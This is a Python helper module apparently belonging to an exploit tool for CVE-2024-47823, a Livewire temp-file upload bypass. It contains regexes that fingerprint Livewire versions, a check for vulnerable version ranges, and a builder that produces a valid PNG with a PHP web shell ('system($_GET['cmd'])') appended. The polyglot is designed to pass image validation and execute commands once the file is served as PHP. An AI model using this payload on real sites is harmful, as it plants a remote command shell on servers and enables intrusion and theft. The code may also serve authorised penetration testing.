"""Pure, leaf helpers for cve_2024_47823 (Livewire temp-file upload bypass).

Extracted verbatim from the main module to keep it closer to the repo's file-size
guideline. These are stateless — version parsing and the PNG/PHP polyglot builder —
with no HTTP or cross-module state, so relocation is behavior-preserving. The main
module re-imports every name, so `cve_2024_47823.<name>` still resolves.
"""

from __future__ import annotations

import re
import struct
import zlib
from typing import Optional

LIVEWIRE_VERSION_PATTERN = re.compile(
    r"(?:Livewire(?:\.|%2[Ee])?[^\d{0,2}]*)v?(\d+\.\d+\.\d+)", re.IGNORECASE
)


def _extract_version_from_livewire_js(text: Optional[str]) -> Optional[str]:
    if not text:
        return None

    # Prefer explicit Livewire version assignments/comments when present.
    m = re.search(
        r"(?:window\.)?(?:Livewire|livewire)[^;\n\r]{0,80}?"
        r"version\s*[:=]\s*[\"']v?(\d+\.\d+(?:\.\d+)?)[\"']",
        text,
        re.I,
    )
    if m:
        return m.group(1).lstrip("vV")

    # Livewire's minified JS can expose only a bare object token like:
    #   {version:"3.15.12", ...}
    m = re.search(r"\bversion\s*:\s*[\"']v?(\d+\.\d+(?:\.\d+)?)[\"']", text, re.I)
    if m:
        return m.group(1).lstrip("vV")

    return None


def _extract_version_from_text(text: Optional[str]) -> Optional[str]:
    version = _extract_version_from_livewire_js(text)
    if version:
        return version

    m2 = LIVEWIRE_VERSION_PATTERN.search(text)
    if m2:
        return m2.group(1).lstrip("vV")
    return None


def _normalize_version_tuple(v: str):
    try:
        parts = v.split(".")
        parts = parts + ["0"] * (3 - len(parts))
        return tuple(int(x) for x in parts[:3])
    except Exception:
        return None


def _is_version_vulnerable(version: str) -> Optional[bool]:
    t = _normalize_version_tuple(version)
    if not t:
        return None
    major = t[0]
    if major == 2:
        return t < _normalize_version_tuple("2.12.7")
    if major == 3:
        return t < _normalize_version_tuple("3.5.2")
    return False


_PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
_WEBSHELL = _PNG_MAGIC + b"\n<?php system($_GET['cmd']); ?>\n"


def _build_png_php_polyglot(command_marker: bytes = b"<?php system($_GET['cmd']); ?>") -> bytes:
    """A REAL 1x1 PNG (valid IHDR/IDAT/IEND) with PHP appended after IEND.

    A bare 8-byte PNG magic is not enough for the authenticated path: Filament's
    ->image() validation runs mime_content_type()/getimagesize() on the stored temp
    file, and 8 magic bytes resolve to application/octet-stream (validation fails).
    A structurally-valid PNG passes the image check (the CVE bypass) while PHP still
    executes the trailing block when the file is served as .php.
    """
    def _chunk(typ: bytes, data: bytes) -> bytes:
        body = typ + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)

    png = (
        _PNG_MAGIC
        + _chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
        + _chunk(b"IDAT", zlib.compress(b"\x00\xff\x00\x00"))
        + _chunk(b"IEND", b"")
    )
    return png + b"\n" + command_marker + b"\n"
